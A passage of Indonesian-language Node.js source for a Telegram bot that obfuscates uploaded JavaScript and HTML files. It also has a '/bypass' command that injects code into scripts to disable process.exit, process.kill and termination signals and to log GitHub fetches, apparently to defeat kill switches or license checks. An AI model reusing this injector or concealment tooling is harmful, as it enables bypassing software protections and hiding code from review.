            deobfuscatedCode = `${bundleInfo}// Kesalahan validasi: ${syntaxError.message}\n${deobfuscatedCode}`;
            isValid = false;
        }

        // Simpan hasil
        await updateProgress(ctx, progressMessage, 80, "Menyimpan Hasil");
        await fs.writeFile(deobfuscatedPath, deobfuscatedCode);

        // Kirim hasil
        log(`Mengirim file hasil deobfuscation: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: deobfuscatedPath, filename: `deobfuscated-${file.file_name}` },
            { caption: `✅ *File berhasil dideobfuscate!${isValid ? "" : " (Perhatikan pesan error dalam file)"}*\nSUKSES ENCRYPT 🕊`, parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Deobfuscation Selesai");

        // Hapus file sementara
        if (await fs.pathExists(deobfuscatedPath)) {
            await fs.unlink(deobfuscatedPath);
            log(`File sementara dihapus: ${deobfuscatedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat deobfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan file Javascript yang valid!_`);
        if (await fs.pathExists(deobfuscatedPath)) {
            await fs.unlink(deobfuscatedPath);
            log(`File sementara dihapus setelah error: ${deobfuscatedPath}`);
        }
    }
});

// Command /encstrong (Obfuscation baru dengan metode Strong)
bot.command("encinvis", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }
    
    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encinvis`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `invisible-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ⚙️ Memulai (InvisiBle) (1%)\n` +
            ` ${createProgressBar(1)}\n` +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Strong obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Strong`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened Invisible Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getStrongObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated; // Pastikan string
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Invisible: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Invisible) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened Invisible Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Invisible obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encquantum", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encquantum`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `quantum-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Quantum Vortex Encryption) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Quantum Vortex Encryption: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan Quantum Vortex Encryption`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Quantum Vortex Encryption");
        const obfuscatedCode = await obfuscateQuantum(fileContent);
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi quantum: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `quantum-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Quantum Vortex Encryption) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Quantum Vortex Encryption Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Quantum obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encnova
bot.command("encvar", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encvar`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `var-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Var) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Var obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Var`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Var Dynamic Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getNovaObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Var: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `Var-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Var) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Var Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Nova obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encnebula", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encnebula`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `nebula-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Nebula Polymorphic Storm) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Nebula obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Nebula`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Nebula Polymorphic Storm");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getNebulaObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Nebula: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `nebula-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Nebula Polymorphic Storm) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Nebula Polymorphic Storm Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Nebula obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encsiu", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encsiu`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `siucalcrick-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Calcrick Chaos Core) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Siu+Calcrick obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Siu+Calcrick`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Calcrick Chaos Core");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getSiuCalcrickObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Siu+Calcrick: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `siucalcrick-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Calcrick Chaos Core) siap!*\nSUKSES ENCRYPT 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Calcrick Chaos Core Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Siu+Calcrick obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("enclock", async (ctx) => {

    const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }
   
    const args = ctx.message.text.split(" ").slice(1);
    if (args.length !== 1 || !/^\d+$/.test(args[0]) || parseInt(args[0]) < 1 || parseInt(args[0]) > 365) {
        return ctx.replyWithMarkdown("❌ *Error:* Gunakan format `/enclock [1-365]` untuk jumlah hari (misal: `/enclock 7`)!");
    }

    const days = args[0];
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryFormatted = expiryDate.toLocaleDateString();

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/locked [1-365]`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `locked-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Time-Locked Encryption) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "PROSES ENCRYPT "
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Time-Locked Encryption: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan Time-Locked Encryption`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Time-Locked Encryption");
        const obfuscatedCode = await obfuscateTimeLocked(fileContent, days);
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi time-locked: ${file.file_name}`);
        await ctx.replyWithMarkdown(
            `✅ *File terenkripsi (Time-Locked Encryption) siap!*\n` +
            `⏰ Masa aktif: ${days} hari (Kedaluwarsa: ${expiryFormatted})\n` +
            `_Powered by XHINN_`,
            { parse_mode: "Markdown" }
        );
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `locked-encrypted-${file.file_name}` }
        );
        await updateProgress(ctx, progressMessage, 100, "Time-Locked Encryption Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Time-Locked obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("enchtml", async (ctx) => {
  try {
  const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }
    
    const args = ctx.message.text.split(" ").slice(1);
    const customName = args[0] || "ᴅᴇᴀᴛʜ ᴋɪɴɢs 👑";

    if (!ctx.message.reply_to_message?.document) {
      return ctx.reply("❌ Balas file `.html` untuk dienkripsi.");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".html")) {
      return ctx.reply("❌ File harus berformat `.html`");
    }

    const tempDir = path.join(__dirname, "tmp");
    await fs.ensureDir(tempDir);

    const outputFile = path.join(tempDir, `${customName}.html`);

    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        " ⚙️ Memulai Enkripsi HTML (1%)\n" +
        ` ${createProgressBar(1)}\n` +
        "```\n" +
        "PROSES ENCRYPT "
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink.href);
    const htmlContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    await updateProgress(ctx, progressMessage, 40, "Encoding Base64");
    const base64Encoded = Buffer.from(htmlContent, "utf8").toString("base64");

    const resultScript = `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Encrypted HTML</title></head>
<body>
<script>
document.write(atob("${base64Encoded}"))
</script>
</body>
</html>`;

    await updateProgress(ctx, progressMessage, 70, "Menyimpan Hasil");
    await fs.writeFile(outputFile, resultScript);

    await ctx.replyWithDocument(
      { source: outputFile, filename: `enc-${file.file_name}` },
      {
        caption: `✅ *File HTML terenkripsi base64*\nGunakan hanya di browser.\nNama: \`${customName}\``,
        parse_mode: "Markdown",
      }
    );
    await updateProgress(ctx, progressMessage, 100, "Selesai");

    await fs.remove(outputFile);
  } catch (err) {
    console.error("[EncryptHTML Error]", err);
    ctx.reply("❌ Gagal enkripsi file HTML.");
  }
});

bot.command("bypass", async (ctx) => {
  const { isChannelMember, isGroupMember } = await checkChannelAndGroup(ctx);

    if (!isChannelMember || !isGroupMember) {
        return ctx.reply(
            "❌ Anda harus join *channel & group* dulu sebelum memakai command",
            {
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📢 Join Channel", url: "https://t.me/Death_kings01" }],
                        [{ text: "👥 Join Group", url: "https://t.me/Death_kings10" }]
                    ]
                }
            }
        );
    }

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/bypass`!");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
  }

  const bypassedPath = path.join(__dirname, `bypassed-${file.file_name}`);

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🛠 BypassBot\n" +
        " ⚙️ Memulai Suntik Bypass (1%)\n" +
        ` ${createProgressBar(1)}\n` +
        "```\n" +
        "PROSES BYPAS "
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file untuk bypass: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    const bypassScript = `/* === BYPASS INJECTED === */
const axios = require("axios");
const chalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      chalk.blue(\`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
███╗░░░███╗░█████╗░██████╗░██╗░░██╗███████╗██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██║░░██║╚════██║╚██╗░██╔╝
██╔████╔██║██║░░██║██║░░██║███████║░░███╔═╝░╚████╔╝░
██║╚██╔╝██║██║░░██║██║░░██║██╔══██║██╔══╝░░░░╚██╔╝░░
██║░╚═╝░██║╚█████╔╝██████╔╝██║░░██║███████╗░░░██║░░░
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░\`) +
        chalk.green("\\n]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL TIDAK DIKETAHUI";
  console.error(
    chalk.green("𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗢 𝗔𝗖𝗖𝗘𝗦𝗦: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}
axios.interceptors.request.use(requestInterceptor, errorInterceptor);
const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  },
});
const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  } else {
    return originalKill(pid, signal);
  }
};
["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log(chalk.red("SINYAL " + signal + " TERDETEKSI DAN DIABAIKAN"));
  });
});
function vvvvvvv2(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
     chalk.green("\\n ]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function startProgressBar() {
    const progressSteps = [
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
